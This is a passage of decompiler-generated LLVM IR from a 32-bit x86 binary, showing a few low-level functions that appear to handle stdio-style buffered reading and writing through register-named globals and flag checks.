  %v0_804f979 = phi i32 [ %v4_804f95b, %dec_label_pc_804f96c.lr.ph ], [ %v0_804f979.pre, %dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge ]
  %v0_804f978 = phi i32 [ %arg2, %dec_label_pc_804f96c.lr.ph ], [ %v2_804f98a, %dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge ]
  %v0_804f974.in = phi i32 [ %arg3, %dec_label_pc_804f96c.lr.ph ], [ %v2_804f988, %dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge ]
  %v4_804f974 = phi i32 [ %arg3, %dec_label_pc_804f96c.lr.ph ], [ %v2_804f988, %dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge ]
  %v0_804f974 = icmp slt i32 %v0_804f974.in, 0
  store i32 %v4_804f974, i32* %esi.global-to-local, align 4
  %v2_804f974 = icmp eq i1 %v0_804f974, false
  %v5_804f974 = select i1 %v2_804f974, i32 %v4_804f974, i32 2147483647
  store i32 %v5_804f974, i32* %eax.global-to-local, align 4
  %v1_804f979 = add i32 %v0_804f979, 4
  %v2_804f979 = inttoptr i32 %v1_804f979 to i32*
  %v3_804f979 = load i32, i32* %v2_804f979, align 4
  %tmp36 = inttoptr i32 %v0_804f978 to i32*
  %v5_804f97c = call i32 @function_804b79c(i32 %v3_804f979, i32* %tmp36, i32 %v5_804f974)
  store i32 %v5_804f97c, i32* %eax.global-to-local, align 4
  %v1_804f984 = icmp eq i32 %v5_804f97c, 0
  store i1 %v1_804f984, i1* %zf.global-to-local, align 1
  %v2_804f984 = icmp slt i32 %v5_804f97c, 0
  br i1 %v2_804f984, label %dec_label_pc_804f98e, label %dec_label_pc_804f988

dec_label_pc_804f988:                             ; preds = %dec_label_pc_804f96c
  %v0_804f988 = load i32, i32* @ebx, align 4
  %v2_804f988 = sub i32 %v0_804f988, %v5_804f97c
  %v12_804f988 = icmp eq i32 %v2_804f988, 0
  store i32 %v2_804f988, i32* @ebx, align 4
  %v0_804f98a = load i32, i32* @edi, align 4
  %v2_804f98a = add i32 %v0_804f98a, %v5_804f97c
  store i32 %v2_804f98a, i32* @edi, align 4
  store i1 %v12_804f988, i1* %zf.global-to-local, align 1
  br i1 %v12_804f988, label %dec_label_pc_804f9c8, label %dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge

dec_label_pc_804f988.dec_label_pc_804f96c_crit_edge: ; preds = %dec_label_pc_804f988
  %v0_804f979.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f96c

dec_label_pc_804f98e:                             ; preds = %dec_label_pc_804f96c
  %v0_804f98e = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f98e = inttoptr i32 %v0_804f98e to i32*
  %v2_804f98e = load i32, i32* %v1_804f98e, align 4
  store i32 %v2_804f98e, i32* %eax.global-to-local, align 4
  %v1_804f991 = add i32 %v0_804f98e, 8
  %v2_804f991 = inttoptr i32 %v1_804f991 to i32*
  %v3_804f991 = load i32, i32* %v2_804f991, align 4
  store i32 %v3_804f991, i32* @edx, align 4
  %v1_804f994 = or i32 %v2_804f98e, 8
  store i32 %v1_804f994, i32* %eax.global-to-local, align 4
  %v1_804f997 = trunc i32 %v1_804f994 to i16
  %v3_804f997 = inttoptr i32 %v0_804f98e to i16*
  store i16 %v1_804f997, i16* %v3_804f997, align 2
  %v0_804f99b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f99b = add i32 %v0_804f99b, 12
  %v2_804f99b = inttoptr i32 %v1_804f99b to i32*
  %v3_804f99b = load i32, i32* %v2_804f99b, align 4
  %v1_804f99e = load i32, i32* @edx, align 4
  %v2_804f99e = sub i32 %v3_804f99b, %v1_804f99e
  %v12_804f99e = icmp eq i32 %v2_804f99e, 0
  store i1 %v12_804f99e, i1* %zf.global-to-local, align 1
  store i32 %v2_804f99e, i32* %eax.global-to-local, align 4
  %v4_804f9c4.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804f99e, label %dec_label_pc_804f9c4, label %dec_label_pc_804f9a2

dec_label_pc_804f9a2:                             ; preds = %dec_label_pc_804f98e
  %v12_804f9a2 = icmp eq i32 %v2_804f99e, %v4_804f9c4.pre
  store i1 %v12_804f9a2, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_804f99e, %v4_804f9c4.pre
  %v3_804f9a4 = load i32, i32* %esi.global-to-local, align 4
  %v5_804f9a4 = select i1 %tmp, i32 %v2_804f99e, i32 %v3_804f9a4
  store i32 %v5_804f9a4, i32* %esi.global-to-local, align 4
  %v0_804f9a7.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f9a7

dec_label_pc_804f9a7:                             ; preds = %dec_label_pc_804f9b9, %dec_label_pc_804f9a2
  %v2_804f9ab = phi i32 [ %v1_804f9b5, %dec_label_pc_804f9b9 ], [ %v1_804f99e, %dec_label_pc_804f9a2 ]
  %v4_804f9a7 = phi i32 [ %v4_804f9a7.pre, %dec_label_pc_804f9b9 ], [ %v2_804f99e, %dec_label_pc_804f9a2 ]
  %v0_804f9a7 = phi i32 [ %v1_804f9b9, %dec_label_pc_804f9b9 ], [ %v0_804f9a7.pre, %dec_label_pc_804f9a2 ]
  %v1_804f9a7 = inttoptr i32 %v0_804f9a7 to i8*
  %v2_804f9a7 = load i8, i8* %v1_804f9a7, align 1
  %v3_804f9a7 = zext i8 %v2_804f9a7 to i32
  %v5_804f9a7 = and i32 %v4_804f9a7, -256
  %v6_804f9a7 = or i32 %v3_804f9a7, %v5_804f9a7
  store i32 %v6_804f9a7, i32* %eax.global-to-local, align 4
  %v10_804f9a9 = icmp eq i8 %v2_804f9a7, 10
  store i1 %v10_804f9a9, i1* %zf.global-to-local, align 1
  %v3_804f9ab = inttoptr i32 %v2_804f9ab to i8*
  store i8 %v2_804f9a7, i8* %v3_804f9ab, align 1
  %v0_804f9ad = load i1, i1* %zf.global-to-local, align 1
  %v1_804f9ad = icmp eq i1 %v0_804f9ad, false
  br i1 %v1_804f9ad, label %dec_label_pc_804f9b5, label %dec_label_pc_804f9af

dec_label_pc_804f9af:                             ; preds = %dec_label_pc_804f9a7
  %v0_804f9af = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f9af = add i32 %v0_804f9af, 1
  %v2_804f9af = inttoptr i32 %v1_804f9af to i8*
  %v3_804f9af = load i8, i8* %v2_804f9af, align 1
  %v4_804f9af = urem i8 %v3_804f9af, 2
  %v5_804f9af = icmp eq i8 %v4_804f9af, 0
  store i1 %v5_804f9af, i1* %zf.global-to-local, align 1
  %v1_804f9b3 = icmp eq i1 %v5_804f9af, false
  br i1 %v1_804f9b3, label %dec_label_pc_804f9af.dec_label_pc_804f9bc_crit_edge, label %dec_label_pc_804f9b5

dec_label_pc_804f9af.dec_label_pc_804f9bc_crit_edge: ; preds = %dec_label_pc_804f9af
  %v0_804f9bc.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f9bc

dec_label_pc_804f9b5:                             ; preds = %dec_label_pc_804f9af, %dec_label_pc_804f9a7
  %v0_804f9b5 = load i32, i32* @edx, align 4
  %v1_804f9b5 = add i32 %v0_804f9b5, 1
  store i32 %v1_804f9b5, i32* @edx, align 4
  %v0_804f9b6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f9b6 = add i32 %v0_804f9b6, -1
  %v8_804f9b6 = icmp eq i32 %v1_804f9b6, 0
  store i1 %v8_804f9b6, i1* %zf.global-to-local, align 1
  store i32 %v1_804f9b6, i32* %esi.global-to-local, align 4
  br i1 %v8_804f9b6, label %dec_label_pc_804f9b5.dec_label_pc_804f9bc_crit_edge, label %dec_label_pc_804f9b9

dec_label_pc_804f9b5.dec_label_pc_804f9bc_crit_edge: ; preds = %dec_label_pc_804f9b5
  %v1_804f9bc.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f9bc

dec_label_pc_804f9b9:                             ; preds = %dec_label_pc_804f9b5
  %v0_804f9b9 = load i32, i32* @edi, align 4
  %v1_804f9b9 = add i32 %v0_804f9b9, 1
  %v8_804f9b9 = icmp eq i32 %v1_804f9b9, 0
  store i1 %v8_804f9b9, i1* %zf.global-to-local, align 1
  store i32 %v1_804f9b9, i32* @edi, align 4
  %v4_804f9a7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9a7

dec_label_pc_804f9bc:                             ; preds = %dec_label_pc_804f9b5.dec_label_pc_804f9bc_crit_edge, %dec_label_pc_804f9af.dec_label_pc_804f9bc_crit_edge
  %v1_804f9bc = phi i32 [ %v0_804f9af, %dec_label_pc_804f9af.dec_label_pc_804f9bc_crit_edge ], [ %v1_804f9bc.pre, %dec_label_pc_804f9b5.dec_label_pc_804f9bc_crit_edge ]
  %v0_804f9bc = phi i32 [ %v0_804f9bc.pre, %dec_label_pc_804f9af.dec_label_pc_804f9bc_crit_edge ], [ %v1_804f9b5, %dec_label_pc_804f9b5.dec_label_pc_804f9bc_crit_edge ]
  %v2_804f9bc = add i32 %v1_804f9bc, 16
  %v3_804f9bc = inttoptr i32 %v2_804f9bc to i32*
  store i32 %v0_804f9bc, i32* %v3_804f9bc, align 4
  %v0_804f9bf = load i32, i32* @edx, align 4
  %v1_804f9bf = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f9bf = add i32 %v1_804f9bf, 8
  %v3_804f9bf = inttoptr i32 %v2_804f9bf to i32*
  %v4_804f9bf = load i32, i32* %v3_804f9bf, align 4
  %v5_804f9bf = sub i32 %v0_804f9bf, %v4_804f9bf
  store i32 %v5_804f9bf, i32* @edx, align 4
  %v0_804f9c2 = load i32, i32* @ebx, align 4
  %v2_804f9c2 = sub i32 %v0_804f9c2, %v5_804f9bf
  %v12_804f9c2 = icmp eq i32 %v2_804f9c2, 0
  store i1 %v12_804f9c2, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804f9c4

dec_label_pc_804f9c4:                             ; preds = %dec_label_pc_804f98e, %dec_label_pc_804f9bc
  %v4_804f9c4 = phi i32 [ %v2_804f9c2, %dec_label_pc_804f9bc ], [ %v4_804f9c4.pre, %dec_label_pc_804f98e ]
  %v5_804f9c4 = sub i32 %arg3, %v4_804f9c4
  %v15_804f9c4 = icmp eq i32 %v5_804f9c4, 0
  store i1 %v15_804f9c4, i1* %zf.global-to-local, align 1
  %v0_804f9cc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f9c8

dec_label_pc_804f9c8:                             ; preds = %dec_label_pc_804f988, %dec_label_pc_804f954, %dec_label_pc_804f9c4
  %v0_804f9cc = phi i32 [ %v0_804f9cc.pre, %dec_label_pc_804f9c4 ], [ %v15_804f958, %dec_label_pc_804f954 ], [ %v15_804f958, %dec_label_pc_804f988 ]
  %stack_var_12.0 = phi i32 [ %v5_804f9c4, %dec_label_pc_804f9c4 ], [ 0, %dec_label_pc_804f954 ], [ %arg3, %dec_label_pc_804f988 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_804f9cc = icmp eq i32 %v0_804f9cc, -12
  store i1 %v9_804f9cc, i1* %zf.global-to-local, align 1
  store i32 %v0_804f957, i32* @ebx, align 4
  store i32 %v0_804f955, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804f9b9, { 1, 2, 0 }
  uselistorder i32 %v1_804f9b6, { 1, 0 }
  uselistorder i32 %v1_804f9b5, { 0, 2, 1 }
  uselistorder i8 %v2_804f9a7, { 1, 0, 2 }
  uselistorder i32 %v4_804f9c4.pre, { 2, 0, 1 }
  uselistorder i32 %v2_804f99e, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_804f98a, { 1, 0 }
  uselistorder i32 %v2_804f988, { 2, 3, 0, 1 }
  uselistorder i32 %v5_804f97c, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 4, 3, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_804b79c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_804f9c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f9c4, { 1, 0 }
}

define i32 @function_804f9d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f9d4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f9d4 = load i32, i32* @ebp, align 4
  %v0_804f9d5 = load i32, i32* @edi, align 4
  %v0_804f9d6 = load i32, i32* @esi, align 4
  %v0_804f9d7 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9d7, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804f9e7 = add i32 %arg3, 1
  %v2_804f9e7 = inttoptr i32 %v1_804f9e7 to i8*
  %v3_804f9e7 = load i8, i8* %v2_804f9e7, align 1
  %v4_804f9e7 = and i8 %v3_804f9e7, 2
  %v5_804f9e7 = icmp eq i8 %v4_804f9e7, 0
  %v1_804f9eb = icmp eq i1 %v5_804f9e7, false
  br i1 %v1_804f9eb, label %dec_label_pc_804fa9c, label %dec_label_pc_804f9f1

dec_label_pc_804f9f1:                             ; preds = %dec_label_pc_804f9d4
  %v1_804f9f1 = add i32 %arg3, 4
  %v2_804f9f1 = inttoptr i32 %v1_804f9f1 to i32*
  %v3_804f9f1 = load i32, i32* %v2_804f9f1, align 4
  %v13_804f9f1 = icmp eq i32 %v3_804f9f1, -2
  %v1_804f9f5 = add i32 %arg3, 16
  %v2_804f9f5 = inttoptr i32 %v1_804f9f5 to i32*
  %v3_804f9f5 = load i32, i32* %v2_804f9f5, align 4
  store i32 %v3_804f9f5, i32* @edx, align 4
  %v1_804f9f8 = add i32 %arg3, 12
  %v2_804f9f8 = inttoptr i32 %v1_804f9f8 to i32*
  %v3_804f9f8 = load i32, i32* %v2_804f9f8, align 4
  store i32 %v3_804f9f8, i32* %eax.global-to-local, align 4
  %v1_804f9fb = icmp eq i1 %v13_804f9f1, false
  %v2_804fa1a = sub i32 %v3_804f9f8, %v3_804f9f5
  br i1 %v1_804f9fb, label %dec_label_pc_804fa1a, label %dec_label_pc_804f9fd

dec_label_pc_804f9fd:                             ; preds = %dec_label_pc_804f9f1
  %tmp = icmp uge i32 %v2_804fa1a, %arg2
  %v5_804fa04 = select i1 %tmp, i32 %arg2, i32 %v2_804fa1a
  store i32 %v5_804fa04, i32* %ebx.global-to-local, align 4
  %v3_804fa0a = inttoptr i32 %v3_804f9f5 to i16*
  %v4_804fa0a = call i32 @function_804d1a8(i16* %v3_804fa0a, i32 %v5_804fa04, i32 %v3_804f9f8)
  store i32 %v4_804fa0a, i32* %eax.global-to-local, align 4
  %v0_804fa12 = load i32, i32* @esi, align 4
  %v1_804fa12 = add i32 %v0_804fa12, 16
  %v2_804fa12 = inttoptr i32 %v1_804fa12 to i32*
  %v3_804fa12 = load i32, i32* %v2_804fa12, align 4
  %v4_804fa12 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804fa12 = add i32 %v4_804fa12, %v3_804fa12
  store i32 %v5_804fa12, i32* %v2_804fa12, align 4
  br label %dec_label_pc_804fab4

dec_label_pc_804fa1a:                             ; preds = %dec_label_pc_804f9f1
  store i32 %v2_804fa1a, i32* %eax.global-to-local, align 4
  %v6_804fa1e = icmp ult i32 %v2_804fa1a, %arg2
  br i1 %v6_804fa1e, label %dec_label_pc_804fa83, label %dec_label_pc_804fa20

dec_label_pc_804fa20:                             ; preds = %dec_label_pc_804fa1a
  %v0_804fa20 = load i32, i32* @ecx, align 4
  %v3_804fa24 = inttoptr i32 %v3_804f9f5 to i16*
  %v4_804fa24 = call i32 @function_804d1a8(i16* %v3_804fa24, i32 %arg2, i32 %v0_804fa20)
  store i32 %v4_804fa24, i32* %eax.global-to-local, align 4
  %v0_804fa2c = load i32, i32* @esi, align 4
  %v1_804fa2c = add i32 %v0_804fa2c, 16
  %v2_804fa2c = inttoptr i32 %v1_804fa2c to i32*
  %v3_804fa2c = load i32, i32* %v2_804fa2c, align 4
  %v4_804fa2c = load i32, i32* @edi, align 4
  %v5_804fa2c = add i32 %v4_804fa2c, %v3_804fa2c
  store i32 %v5_804fa2c, i32* %v2_804fa2c, align 4
  %v0_804fa2f = load i32, i32* @esi, align 4
  %v1_804fa2f = add i32 %v0_804fa2f, 1
  %v2_804fa2f = inttoptr i32 %v1_804fa2f to i8*
  %v3_804fa2f = load i8, i8* %v2_804fa2f, align 1
  %v4_804fa2f = urem i8 %v3_804fa2f, 2
  %v5_804fa2f = icmp eq i8 %v4_804fa2f, 0
  br i1 %v5_804fa2f, label %dec_label_pc_804fab4, label %dec_label_pc_804fa35

dec_label_pc_804fa35:                             ; preds = %dec_label_pc_804fa20
  %v0_804fa35 = load i32, i32* @edx, align 4
  %v0_804fa36 = load i32, i32* @edi, align 4
  %v4_804fa3a = call i32 @function_80503c8(i8 10, i32 %v0_804fa36, i32 %v0_804fa35)
  store i32 %v4_804fa3a, i32* %eax.global-to-local, align 4
  %v1_804fa42 = icmp eq i32 %v4_804fa3a, 0
  br i1 %v1_804fa42, label %dec_label_pc_804fab4, label %dec_label_pc_804fa46

dec_label_pc_804fa46:                             ; preds = %dec_label_pc_804fa35
  %v0_804fa49 = load i32, i32* @esi, align 4
  %v1_804fa4a = call i32 @function_804c010(i32 %v0_804fa49)
  store i32 %v1_804fa4a, i32* %eax.global-to-local, align 4
  %v1_804fa52 = icmp eq i32 %v1_804fa4a, 0
  br i1 %v1_804fa52, label %dec_label_pc_804fab4, label %dec_label_pc_804fa56

dec_label_pc_804fa56:                             ; preds = %dec_label_pc_804fa46
  %v0_804fa56 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_804fa56, %v1_804fa4a
  %v5_804fa5a = select i1 %tmp20, i32 %v0_804fa56, i32 %v1_804fa4a
  store i32 %v5_804fa5a, i32* %ebx.global-to-local, align 4
  %v2_804fa5f = sub i32 %v0_804fa56, %v5_804fa5a
  store i32 %v2_804fa5f, i32* %eax.global-to-local, align 4
  %v0_804fa61 = load i32, i32* @ebp, align 4
  %v2_804fa61 = add i32 %v0_804fa61, %v2_804fa5f
  store i32 %v2_804fa61, i32* %ebp.global-to-local, align 4
  %v4_804fa68 = call i32 @function_8050358(i8* inttoptr (i32 10 to i8*), i32 %v5_804fa5a, i32 %v2_804fa5f)
  store i32 %v4_804fa68, i32* %eax.global-to-local, align 4
  %v1_804fa70 = icmp eq i32 %v4_804fa68, 0
  store i32 %v4_804fa68, i32* @edx, align 4
  br i1 %v1_804fa70, label %dec_label_pc_804fab4, label %dec_label_pc_804fa76

dec_label_pc_804fa76:                             ; preds = %dec_label_pc_804fa56
  %v0_804fa76 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fa76 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fa76 = sub i32 %v0_804fa76, %v4_804fa68
  %v2_804fa7a = add i32 %v2_804fa76, %v1_804fa76
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v0_804fa7c = load i32, i32* @esi, align 4
  %v1_804fa7c = add i32 %v0_804fa7c, 16
  %v2_804fa7c = inttoptr i32 %v1_804fa7c to i32*
  %v3_804fa7c = load i32, i32* %v2_804fa7c, align 4
  %v5_804fa7c = sub i32 %v3_804fa7c, %v2_804fa7a
  store i32 %v5_804fa7c, i32* %v2_804fa7c, align 4
  %v0_804fa7f = load i32, i32* @edi, align 4
  %v1_804fa7f = load i32, i32* %eax.global-to-local, align 4
  %v2_804fa7f = sub i32 %v0_804fa7f, %v1_804fa7f
  store i32 %v2_804fa7f, i32* @edi, align 4
  br label %dec_label_pc_804fab4

dec_label_pc_804fa83:                             ; preds = %dec_label_pc_804fa1a
  %v2_804fa83 = add i32 %arg3, 8
  %v3_804fa83 = inttoptr i32 %v2_804fa83 to i32*
  %v4_804fa83 = load i32, i32* %v3_804fa83, align 4
  %v15_804fa83 = icmp eq i32 %v3_804f9f5, %v4_804fa83
  br i1 %v15_804fa83, label %dec_label_pc_804fa9c, label %dec_label_pc_804fa88

dec_label_pc_804fa88:                             ; preds = %dec_label_pc_804fa83
  %v1_804fa8c = call i32 @function_804c010(i32 %arg3)
  store i32 %v1_804fa8c, i32* %eax.global-to-local, align 4
  %v1_804fa94 = icmp eq i32 %v1_804fa8c, 0
  br i1 %v1_804fa94, label %dec_label_pc_804fa88.dec_label_pc_804fa9c_crit_edge, label %dec_label_pc_804fa98

dec_label_pc_804fa88.dec_label_pc_804fa9c_crit_edge: ; preds = %dec_label_pc_804fa88
  %v0_804fa9c.pre = load i32, i32* @edi, align 4
  %v0_804faa4.pre = load i32, i32* @esi, align 4
  %v2_804faab.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804fa9c

dec_label_pc_804fa98:                             ; preds = %dec_label_pc_804fa88
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804fab4

dec_label_pc_804fa9c:                             ; preds = %dec_label_pc_804fa88.dec_label_pc_804fa9c_crit_edge, %dec_label_pc_804fa83, %dec_label_pc_804f9d4
  %v2_804faab = phi i32 [ %v2_804faab.pre, %dec_label_pc_804fa88.dec_label_pc_804fa9c_crit_edge ], [ %v0_804f9d7, %dec_label_pc_804fa83 ], [ %v0_804f9d7, %dec_label_pc_804f9d4 ]
  %v0_804faa4 = phi i32 [ %v0_804faa4.pre, %dec_label_pc_804fa88.dec_label_pc_804fa9c_crit_edge ], [ %arg3, %dec_label_pc_804fa83 ], [ %arg3, %dec_label_pc_804f9d4 ]
  %v0_804fa9c = phi i32 [ %v0_804fa9c.pre, %dec_label_pc_804fa88.dec_label_pc_804fa9c_crit_edge ], [ %arg2, %dec_label_pc_804fa83 ], [ %arg2, %dec_label_pc_804f9d4 ]
  store i32 %v2_804faab, i32* @ebx, align 4
  store i32 %v0_804f9d5, i32* @edi, align 4
  %v4_804faaf = inttoptr i32 %v0_804faa4 to i16*
  %v5_804faaf = call i32 @function_804f954(i16* %v4_804faaf, i32 %v0_804fa9c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804faaf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fab4

dec_label_pc_804fab4:                             ; preds = %dec_label_pc_804fa56, %dec_label_pc_804fa46, %dec_label_pc_804fa35, %dec_label_pc_804fa20, %dec_label_pc_804fa98, %dec_label_pc_804fa76, %dec_label_pc_804f9fd, %dec_label_pc_804fa9c
  %v0_804fab7 = load i32, i32* @edi, align 4
  store i32 %v0_804fab7, i32* %eax.global-to-local, align 4
  %v2_804fab9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fab9, i32* @ebx, align 4
  store i32 %v0_804f9d6, i32* @esi, align 4
  store i32 %v0_804f9d5, i32* @edi, align 4
  store i32 %v0_804f9d4, i32* @ebp, align 4
  ret i32 %v0_804fab7

; uselistorder directives
  uselistorder i32 %v2_804fa7a, { 1, 0 }
  uselistorder i32 %v0_804fa56, { 2, 1, 0 }
  uselistorder i32 %v1_804fa4a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804fa1a, { 2, 3, 1, 0 }
  uselistorder i32 %v3_804f9f5, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_804f9d5, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_804fab4, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @function_804fac0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fac0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fac0 = load i32, i32* @ebx, align 4
  %v4_804fac4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fac4, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804facc = load i16, i16* %arg1, align 2
  %v3_804facc = zext i16 %v2_804facc to i32
  store i32 %v3_804facc, i32* %eax.global-to-local, align 4
  %v2_804facf = and i32 %v3_804facc, %arg2
  %v3_804facf = icmp eq i32 %v2_804facf, 0
  %v1_804fad1 = icmp eq i1 %v3_804facf, false
  br i1 %v1_804fad1, label %dec_label_pc_804fadf, label %dec_label_pc_804fad3

dec_label_pc_804fad3:                             ; preds = %dec_label_pc_804fac0
  %v1_804fad3 = and i32 %v3_804facc, 2176
  %v2_804fad3 = icmp eq i32 %v1_804fad3, 0
  %v1_804fad8 = icmp eq i1 %v2_804fad3, false
  br i1 %v1_804fad8, label %dec_label_pc_804fae7, label %dec_label_pc_804fada

dec_label_pc_804fada:                             ; preds = %dec_label_pc_804fad3
  %v2_804fada = or i32 %v3_804facc, %arg2
  store i32 %v2_804fada, i32* %eax.global-to-local, align 4
  %v1_804fadc = trunc i32 %v2_804fada to i16
  store i16 %v1_804fadc, i16* %arg1, align 2
  %v0_804fadf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fadf

dec_label_pc_804fadf:                             ; preds = %dec_label_pc_804fac0, %dec_label_pc_804fada
  %v0_804fb28 = phi i32 [ %v4_804fac4, %dec_label_pc_804fac0 ], [ %v0_804fadf.pre, %dec_label_pc_804fada ]
  %v1_804fadf = inttoptr i32 %v0_804fb28 to i16*
  %v2_804fadf = load i16, i16* %v1_804fadf, align 2
  %v3_804fadf = zext i16 %v2_804fadf to i32
  store i32 %v3_804fadf, i32* %edx.global-to-local, align 4
  %v2_804fae2 = and i16 %v2_804fadf, 32
  %v3_804fae2 = icmp eq i16 %v2_804fae2, 0
  br i1 %v3_804fae2, label %dec_label_pc_804faff, label %dec_label_pc_804fae7

dec_label_pc_804fae7:                             ; preds = %dec_label_pc_804fadf, %dec_label_pc_804fad3
  %v1_804fae7 = call i32 @function_804b7f4(i32 %v0_804fac0)
  store i32 %v1_804fae7, i32* %eax.global-to-local, align 4
  %v1_804faec = inttoptr i32 %v1_804fae7 to i32*
  store i32 9, i32* %v1_804faec, align 4
  br label %dec_label_pc_804faf2

dec_label_pc_804faf2:                             ; preds = %dec_label_pc_804fb16, %dec_label_pc_804fae7
  %v0_804faf2 = load i32, i32* @ebx, align 4
  %v1_804faf2 = inttoptr i32 %v0_804faf2 to i32*
  %v2_804faf2 = load i32, i32* %v1_804faf2, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804faf7 = or i32 %v2_804faf2, 8
  store i32 %v1_804faf7, i32* %eax.global-to-local, align 4
  %v1_804fafa = trunc i32 %v1_804faf7 to i16
  %v3_804fafa = inttoptr i32 %v0_804faf2 to i16*
  store i16 %v1_804fafa, i16* %v3_804fafa, align 2
  br label %dec_label_pc_804fb61

dec_label_pc_804faff:                             ; preds = %dec_label_pc_804fadf
  %v2_804faff = urem i16 %v2_804fadf, 4
  %v3_804faff = icmp eq i16 %v2_804faff, 0
  br i1 %v3_804faff, label %dec_label_pc_804fb49, label %dec_label_pc_804fb04

dec_label_pc_804fb04:                             ; preds = %dec_label_pc_804faff
  %v2_804fb04 = and i32 %v3_804fadf, 4
  %v3_804fb04 = icmp eq i32 %v2_804fb04, 0
  %v1_804fb07 = icmp eq i1 %v3_804fb04, false
  br i1 %v1_804fb07, label %dec_label_pc_804fb35, label %dec_label_pc_804fb09

dec_label_pc_804fb09:                             ; preds = %dec_label_pc_804fb04
  %v1_804fb09 = add i32 %v0_804fb28, 20
  %v2_804fb09 = inttoptr i32 %v1_804fb09 to i32*
  %v3_804fb09 = load i32, i32* %v2_804fb09, align 4
  store i32 %v3_804fb09, i32* %eax.global-to-local, align 4
  %v2_804fb0c = add i32 %v0_804fb28, 16
  %v3_804fb0c = inttoptr i32 %v2_804fb0c to i32*
  %v4_804fb0c = load i32, i32* %v3_804fb0c, align 4
  %v15_804fb0c = icmp eq i32 %v3_804fb09, %v4_804fb0c
  %v1_804fb0f = icmp eq i1 %v15_804fb0c, false
  br i1 %v1_804fb0f, label %dec_label_pc_804fb16, label %dec_label_pc_804fb11

dec_label_pc_804fb11:                             ; preds = %dec_label_pc_804fb09
  %v2_804fb11 = and i32 %v3_804fadf, 2
  %v3_804fb11 = icmp eq i32 %v2_804fb11, 0
  br i1 %v3_804fb11, label %dec_label_pc_804fb35, label %dec_label_pc_804fb16

dec_label_pc_804fb16:                             ; preds = %dec_label_pc_804fb11, %dec_label_pc_804fb09
  %v1_804fb16 = and i32 %v3_804fadf, 1024
  store i32 %v1_804fb16, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_804fb16, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_804fb29 = call i32 @function_80510a0(i32 %v0_804fb28, i32 0, i32 %tmp17, i32 %v1_804fb16)
  store i32 %v5_804fb29, i32* %eax.global-to-local, align 4
  %v1_804fb31 = icmp eq i32 %v5_804fb29, 0
  %v1_804fb33 = icmp eq i1 %v1_804fb31, false
  br i1 %v1_804fb33, label %dec_label_pc_804faf2, label %dec_label_pc_804fb16.dec_label_pc_804fb35_crit_edge

